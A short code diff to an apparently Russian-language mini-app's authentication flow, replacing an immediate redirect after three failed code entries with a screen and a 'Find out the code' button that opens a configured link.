@@ -238,6 +238,18 @@
         .replace(/"/g, "&quot;");
     }
 
+    function renderCodeFail() {
+      var out = '<div class="emoji">🚫</div>'
+        + '<div class="text">Слишком много попыток ввода кода</div>'
+        + '<button class="btn" id="act">Узнать код</button>';
+      html(out);
+      window.scrollTo(0, 0);
+      var act = document.getElementById("act");
+      if (act) {
+        act.onclick = function () { goRedirect(CFG.codeFailRedirect); };
+      }
+    }
+
     function renderStep(i) {
       var p = PAGES[i];
       if (!p) return;
@@ -445,11 +457,10 @@
         finishFlow();
         return;
       }
-      // 3 неверных ввода кода — уводим пользователя по заданной ссылке
+      // 3 неверных ввода кода — кнопка меняется на «Узнать код»
+      // (по нажатию открываем ссылку, мини-апп не закрываем).
       if (data.error === "too_many_code_attempts" && CFG.codeFailRedirect) {
-        AUTH.lastError = errorText(data.error);
-        renderStep(findStepByKey("code") >= 0 ? findStepByKey("code") : step);
-        goRedirect(CFG.codeFailRedirect);
+        renderCodeFail();
         return;
       }
       // Любая ветка ошибки — возвращаемся на шаг code с сообщением
